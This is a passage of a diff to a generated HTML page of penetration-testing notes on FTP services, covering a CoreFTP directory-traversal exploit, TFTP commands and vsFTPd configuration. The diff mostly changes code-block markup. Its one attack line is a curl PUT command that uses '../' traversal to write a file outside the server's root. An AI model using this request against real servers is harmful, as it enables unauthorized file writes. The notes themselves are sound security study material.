 <p>Summary: This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. </p>
 <p>The <a href="https://www.exploit-db.com/exploits/50652">exploit</a> for this attack is relatively straightforward, based on a single <code>cURL</code> command.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
+</span></code></pre></div></td></tr></table></div>
 <p>We create a raw HTTP <code>PUT</code> request (<code>-X PUT</code>) with basic auth (<code>--basic -u &lt;username&gt;:&lt;password&gt;</code>), the path for the file (<code>--path-as-is https://&lt;IP&gt;/../../../../../whoops</code>), and its content (<code>--data-binary "PoC."</code>) with this command. Additionally, we specify the host header (<code>-H "Host: &lt;IP&gt;"</code>) with the IP address of our target system.</p>
 <h2 id="other-ftp-services">Other FTP services</h2>
 <h3 id="tftp">TFTP</h3>
@@ -17482,35 +17561,53 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>
 <h4 id="basic-usage_1">Basic usage</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># Sets the remote host, and optionally the port, for file transfers.
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>connect
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a># Transfers a file or set of files from the remote host to the local host.
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>get
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a># Transfers a file or set of files from the local host onto the remote host
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>put
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a># Exits tftp
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>quit
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
-</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>status
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>
-</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
-</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>verbose 
-</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
-</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span>
+<span class="normal"><a href="#__codelineno-12-15">15</a></span>
+<span class="normal"><a href="#__codelineno-12-16">16</a></span>
+<span class="normal"><a href="#__codelineno-12-17">17</a></span>
+<span class="normal"><a href="#__codelineno-12-18">18</a></span>
+<span class="normal"><a href="#__codelineno-12-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># Sets the remote host, and optionally the port, for file transfers.
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>connect
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a># Transfers a file or set of files from the remote host to the local host.
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>get
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a># Transfers a file or set of files from the local host onto the remote host
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>put
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a># Exits tftp
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a>quit
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a>status
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a>verbose 
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
+</span></code></pre></div></td></tr></table></div>
 <h3 id="vsftpd">vsFTPd</h3>
 <p>One of the most used FTP servers on Linux-based distributions is <a href="https://security.appspot.com/vsftpd.html">vsFTPd</a>. </p>
 <h4 id="installation_1">Installation</h4>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="go">sudo apt install vsftpd </span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="go">sudo apt install vsftpd </span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="configuration-file">Configuration file</h4>
 <p>The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code>.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
+</span></code></pre></div></td></tr></table></div>
 <table>
 <thead>
 <tr>
@@ -17574,8 +17671,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tbody>
 </table>
 <p>In addition, there is a file called <code>/etc/ftpusers</code> that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>cat /etc/ftpusers
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>cat /etc/ftpusers
+</span></code></pre></div></td></tr></table></div>
 <p>Dangerous settings:</p>
 <table>
 <thead>
@@ -17686,7 +17783,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
